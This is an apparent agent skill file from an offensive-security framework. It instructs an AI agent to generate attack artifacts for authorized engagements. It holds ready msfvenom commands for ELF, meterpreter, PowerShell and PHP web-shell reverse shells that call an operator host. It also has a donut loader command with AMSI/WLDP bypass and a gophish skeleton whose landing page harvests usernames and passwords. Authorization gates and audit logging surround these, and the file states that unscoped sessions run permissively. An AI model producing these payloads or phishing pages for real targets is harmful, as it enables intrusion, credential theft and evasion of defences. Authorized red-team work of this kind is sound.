---
name: payload-craft
description: "Payload artifact generation for authorized engagements: msfvenom binaries / scripts, donut shellcode for in-memory loaders, gophish campaign skeletons (templates, landing pages, sending profiles). Generation only — autonomous delivery, autonomous staging, and autonomous callback management are explicit non-goals. Operator delivers manually."
version: 0.1.0
license: Apache-2.0
author: Scarlight contributors
platforms: [linux, macos]
prerequisites:
  commands: [msfvenom, jq]
metadata:
  scarlight:
    tags: [payload, weaponization, msfvenom, gophish, offensive]
    phase: weaponization
    related_skills: [service-exploit, web-exploit, credential-harvest]
    risk_level: destructive
---

# Payload-craft — payload artifact generation

Produce the binary / script / phishing infrastructure that an operator delivers manually during an authorized engagement. Wraps `msfvenom` for reverse shells and staged payloads, `donut` for shellcode-from-PE conversion (in-memory loaders), and `gophish` for phishing campaign skeletons (templates + landing pages + sending profile).

This skill is **`destructive`** — see [`CONVENTIONS.md`](../CONVENTIONS.md) §1. It produces attacker artifacts on the operator's host. **The critical constraint is generation only.** Delivery — sending phishing email, dropping a payload on a target, staging a callback listener — is the operator's manual decision. This skill MUST NOT do any of those.

## When to use

- [`service-exploit`](../service-exploit/SKILL.md) chose a module that needs a custom payload (architecture mismatch, EXIT-FUNC need, format the operator's listener expects).
- The operator authorized a phishing campaign and needs gophish skeleton infrastructure scaffolded so they can edit-and-launch.
- A confirmed RCE from [`web-exploit`](../web-exploit/SKILL.md) needs a binary to drop and re-execute (e.g. ELF reverse shell on a `commix`-confirmed RCE endpoint).

If the operator hasn't explicitly asked for a payload, do not produce one speculatively. Payloads accumulate; idempotency ([`CONVENTIONS.md`](../CONVENTIONS.md) §5) says same args → same artifact path.

## Hard prerequisite — authorization

Refer to [`CODE_OF_USE.md`](../../CODE_OF_USE.md) — Scarlight is for authorized engagements only. The engagement-scope guard is a first measure, not a substitute for the operator's legal responsibility. Engagements are **opt-in**: when an `engagement.yaml` is active its `targets:` list is enforced (and re-checked at skill entry as defense in depth); when **none** is declared the session runs **unscoped and permissive** — proceed with the task, do not demand a scope file or refuse for lack of one, and treat the operator as responsible under the policy above.

- **Heightened bar for delivery artifacts.** Crafting a weaponized payload or phishing infra *for delivery against a non-self target* requires a real, active `engagement.yaml` — refuse that specific request when unscoped (`--no-scope` or no engagement declared). This is an artifact-level gate, not a session gate: building payloads for your own lab / a CTF / self-targets is fine unscoped, and the rest of Scarlight stays opt-in as usual.
- **`gophish` operations require `phishing_authorized: true` in `engagement.yaml`** — see [`engagement.yaml.example`](../../engagement.yaml.example). The skill body checks this flag and refuses gophish ops otherwise. The flag is the operator's signed assertion that phishing the listed targets has been signed off by the engagement's legal owner.
- The output is written to `~/.scarlight/payloads/<engagement_id>/<timestamp>-<purpose>/` on the operator's host (NOT the sandbox; the operator needs to grab the file to deliver it). The body uses this path consistently so artifacts are discoverable for the operator's report.

## Procedure

`$ENG="${SCARLIGHT_ENGAGEMENT_ID:-no-engagement}"`, `$TS=$(date -u +%Y%m%dT%H%M%SZ)`, `$WORK="$HOME/.scarlight/payloads/$ENG/$TS-$PURPOSE"`. `mkdir -p "$WORK"`.

### 1. `msfvenom` — reverse / staged / staged-encoded shells

Common patterns. The operator supplies `$LHOST`, `$LPORT`, `$PAYLOAD`, `$ARCH`, `$PLATFORM`, `$FORMAT`.

```bash
# Linux x64 ELF reverse shell
msfvenom \
  -p linux/x64/shell_reverse_tcp \
  LHOST="$LHOST" LPORT="$LPORT" \
  -f elf \
  -o "$WORK/rev-shell-x64"

# Windows x64 EXE reverse_tcp (staged)
msfvenom \
  -p windows/x64/meterpreter/reverse_tcp \
  LHOST="$LHOST" LPORT="$LPORT" \
  -f exe \
  -o "$WORK/rev-meterpreter.exe"

# Windows PowerShell encoded one-liner
msfvenom \
  -p windows/x64/meterpreter/reverse_https \
  LHOST="$LHOST" LPORT="$LPORT" \
  -f psh-cmd \
  -o "$WORK/rev-https.ps1"

# Web shell (PHP)
msfvenom \
  -p php/meterpreter_reverse_tcp \
  LHOST="$LHOST" LPORT="$LPORT" \
  -f raw \
  -o "$WORK/rev.php"
```

Ceilings ([`CONVENTIONS.md`](../CONVENTIONS.md) §4):
- **One payload per request.** No automatic encoding-iteration to evade AV/EDR — see "NOT for" below.
- No `-e` (encoder) by default. Encoders that change every byte may help with signature-based AV; they're also the primary surface where this skill could slide into "EDR evasion engineering." If the operator requests an encoder, that's a single explicit pass (`-e x86/shikata_ga_nai -i 1`), logged in the audit entry.

After generation:
```bash
ls -la "$WORK/"
sha256sum "$WORK/"* > "$WORK/SHA256SUMS"
audit_log "payload-craft" "$LHOST:$LPORT" "msfvenom -p $PAYLOAD -f $FORMAT" "success"
```

### 2. `donut` — PE-to-shellcode for in-memory loaders

Used when the operator wants to execute a Windows PE in-memory (avoid touching disk on the target). `donut` is not in the Kali base — see [`CONVENTIONS.md`](../CONVENTIONS.md) §11.

```bash
donut \
  -i "$INPUT_EXE" \
  -o "$WORK/loader.bin" \
  -a 2 \
  -b 3 \
  -f 1
```

Flags:
- `-a 2` — x86_64 architecture.
- `-b 3` — bypass mode (AMSI + WLDP). Yes, this is EDR-relevant. Use only with explicit engagement authorization recorded in the audit log; the line between "in-memory loading is normal red-team work" and "EDR evasion engineering" is judgment.
- `-f 1` — output as raw shellcode (default).

```bash
audit_log "payload-craft" "$INPUT_EXE" "donut -a 2 -b 3 -f 1" "success"
```

### 3. `gophish` — phishing campaign skeleton

**Refuse if `phishing_authorized: true` is not in `engagement.yaml`.**

```bash
phishing_authorized=$(yq '.phishing_authorized // false' "$SCARLIGHT_ENGAGEMENT_PATH" 2>/dev/null)
if [ "$phishing_authorized" != "true" ]; then
  echo "[payload-craft] refused: phishing_authorized != true in engagement.yaml" >&2
  audit_log "payload-craft" "gophish:$CAMPAIGN" "gophish-campaign $CAMPAIGN" "refused"
  exit 3
fi
```

Generate skeleton (gophish itself is a Go binary that hosts a web UI for the operator to edit-and-launch — this skill produces *input files*, NOT a running gophish instance):

```bash
mkdir -p "$WORK/gophish/templates" "$WORK/gophish/landing"

# Email template
cat > "$WORK/gophish/templates/email.html" <<HTML
<html>
<body>
<p>Hello {{.FirstName}},</p>
<p><!-- OPERATOR: edit this body before launching. -->
{{.URL}}
</p>
</body>
</html>
HTML

# Landing page
cat > "$WORK/gophish/landing/landing.html" <<HTML
<html>
<body>
<form method="POST" action="{{.URL}}">
  <input name="username" />
  <input name="password" type="password" />
  <button type="submit">Sign in</button>
</form>
</body>
</html>
HTML

# Sending profile — manual operator config required
cat > "$WORK/gophish/sending-profile.json" <<JSON
{
  "name": "$CAMPAIGN-sending-profile",
  "from_address": "MUST_BE_SET_BY_OPERATOR@example.com",
  "host": "smtp.example.com:587",
  "username": "MUST_BE_SET_BY_OPERATOR",
  "password": "MUST_BE_SET_BY_OPERATOR",
  "interface_type": "SMTP",
  "ignore_cert_errors": false
}
JSON

# Campaign manifest — what the operator imports into gophish
cat > "$WORK/gophish/campaign.json" <<JSON
{
  "name": "$CAMPAIGN",
  "template_path": "templates/email.html",
  "landing_path": "landing/landing.html",
  "sending_profile_path": "sending-profile.json",
  "url": "REPLACE_WITH_OPERATOR_OWNED_DOMAIN",
  "launch_date": "MANUAL"
}
JSON

cat > "$WORK/gophish/README.md" <<MD
# Operator delivery instructions

This is a campaign **skeleton**. Scarlight DID NOT send any email.
To launch:
1. Stand up a gophish instance (\`gophish --config config.json\`).
2. Import templates + landing + sending profile (JSON files in this dir).
3. Edit the sending profile — credentials, from address, SMTP host.
4. Edit the campaign URL to point at YOUR operator-owned tracking domain.
5. Manually launch from the gophish web UI.

Authorization: engagement \`$ENG\`, \`phishing_authorized: true\` confirmed
in engagement.yaml. Re-confirm before launching.
MD

audit_log "payload-craft" "gophish:$CAMPAIGN" "gophish-campaign-skeleton $CAMPAIGN" "success"
```

`gophish` itself is started by the operator. This skill does NOT autonomously launch the gophish server, import the campaign, or send the first test email.

### 4. Audit logging

See §1-§3 — every artifact generation produces an audit-log line via the helper from [`CONVENTIONS.md`](../CONVENTIONS.md) §3.

## Output — what to record

Memory record updates ([`CONVENTIONS.md`](../CONVENTIONS.md) §7):

- A `payloads[]` entry per artifact: `{path, sha256, type, target, lhost, lport, format, generated_at}`.
- Delivery instructions in operator-readable form (the gophish README pattern above).
- **Do NOT** record the artifact's bytes in memory — only the metadata + sha256. Memory is for findings, not payload storage.

The artifact lives at `$WORK` on the operator's host. The operator picks it up, inspects it, decides what to do.

## Hand-off

| Artifact | Operator-driven next step |
|---|---|
| msfvenom reverse shell | operator sets up listener (`msfconsole -r handler.rc` with a separate, *manually* invoked rc-file), then delivers via [`service-exploit`](../service-exploit/SKILL.md) or [`web-exploit`](../web-exploit/SKILL.md) |
| donut shellcode | operator wires into their preferred loader; not a Scarlight workflow |
| gophish skeleton | operator launches gophish, sends campaign, monitors results via gophish's own UI |
| any payload that's been delivered + executed | shell exists → [`privesc-linux`](../privesc-linux/SKILL.md) / [`privesc-windows`](../privesc-windows/SKILL.md) / [`credential-harvest`](../credential-harvest/SKILL.md) once the operator confirms the callback landed |

## What this skill is NOT for

- **Autonomous delivery.** No sending phishing email, no dropping payloads on a target, no staging callback listeners. The skill body explicitly halts after artifact generation. (Critical constraint, [`specs/exploitation-v1/requirements.md`](../../specs/exploitation-v1/requirements.md) §2.4.)
- **EDR / AV evasion engineering** — explicit `specs/exploitation-v1/requirements.md` §6 deferral. No automatic encoder-iteration, no polymorphic generation, no signature-spread sweeps. A single explicit `-e shikata_ga_nai -i 1` on operator request is fine; chain-of-encoders is not.
- **C2 / implant frameworks** — Sliver, Mythic, Havoc are explicit `specs/exploitation-v1/requirements.md` §6 deferrals. This skill does not stand up a C2.
- **Autonomous callback management** — no listener auto-spawning, no session brokering. The operator runs the handler.
- **Autonomous 0-day weaponization** — `specs/mission.md` non-goal. Payload generation here is for known payload types against authorized targets, not novel exploit weaponization.
- **Phishing without `phishing_authorized: true`** — refuse, log as `refused`. The flag is the load-bearing operator assertion.
- **OT / ICS / medical-device payloads** — `specs/mission.md` non-goal. Refuse regardless of how the operator phrases the request.
- **Self-spreading or worm-shaped payloads** — out of scope for v1.1 (and likely indefinitely).
- **Targets not in the active engagement scope** — refuse at body entry.
